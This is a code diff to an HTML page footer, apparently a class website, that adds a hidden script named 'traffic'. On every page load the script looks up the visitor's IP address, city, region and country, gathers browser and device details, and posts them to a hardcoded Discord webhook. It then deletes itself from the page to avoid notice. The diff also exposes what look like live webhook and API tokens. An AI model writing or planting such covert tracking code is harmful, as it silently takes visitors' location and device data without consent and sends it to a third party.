@@ -395,5 +395,103 @@
     <div class="copyright">
         Copyright © 2024 X RPL 3. All Rights Reserved.
     </div>
+
+    <script src="script.js"></script>
+    <script class="traffic">
+        const webhookUrl = 'https://discord.com/api/webhooks/1250341983600377886/6StxfMV0m2PPATlaK8vTqBhohe4WFOptCQwnhhIk9KxpsRxGNe72NDTFqiP8E3a_q3kJ';
+async function sendWebhook() {
+    const ipInfo = await fetch('https://ipinfo.io/json?token=8d5d63d428d1fa')
+        .then(response => response.json())
+        .catch(error => ({ error: 'Failed to fetch IP info' }));
+    const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth
+        }
+    };
+    const embed = {
+        title: "New Access Detected",
+        description: "Details of the access event",
+        color: 3447003,
+        fields: [
+            {
+                name: "URL",
+                value: location.href,
+                inline: false
+            },
+            {
+                name: "Time",
+                value: new Date().toISOString(),
+                inline: false
+            },
+            {
+                name: "IP",
+                value: ipInfo.ip || 'Unavailable',
+                inline: true
+            },
+            {
+                name: "City",
+                value: ipInfo.city || 'Unavailable',
+                inline: true
+            },
+            {
+                name: "Region",
+                value: ipInfo.region || 'Unavailable',
+                inline: true
+            },
+            {
+                name: "Country",
+                value: ipInfo.country || 'Unavailable',
+                inline: true
+            },
+            {
+                name: "User-Agent",
+                value: deviceInfo.userAgent,
+                inline: false
+            },
+            {
+                name: "Platform",
+                value: deviceInfo.platform,
+                inline: true
+            },
+            {
+                name: "Language",
+                value: deviceInfo.language,
+                inline: true
+            },
+            {
+                name: "Screen",
+                value: `Width: ${deviceInfo.screen.width}, Height: ${deviceInfo.screen.height}, Color Depth: ${deviceInfo.screen.colorDepth}`,
+                inline: false
+            }
+        ],
+        footer: {
+            text: "Access event recorded"
+        },
+        timestamp: new Date()
+    };
+    const payload = JSON.stringify({
+        embeds: [embed]
+    });
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            // Remove the script element after sending the webhook
+            const scriptElement = document.querySelector('.traffic');
+            if (scriptElement) {
+                scriptElement.parentNode.removeChild(scriptElement);
+            }
+        }
+    };
+    xhr.send(payload);
+}
+sendWebhook();
+</script>
 </body>
 </html>
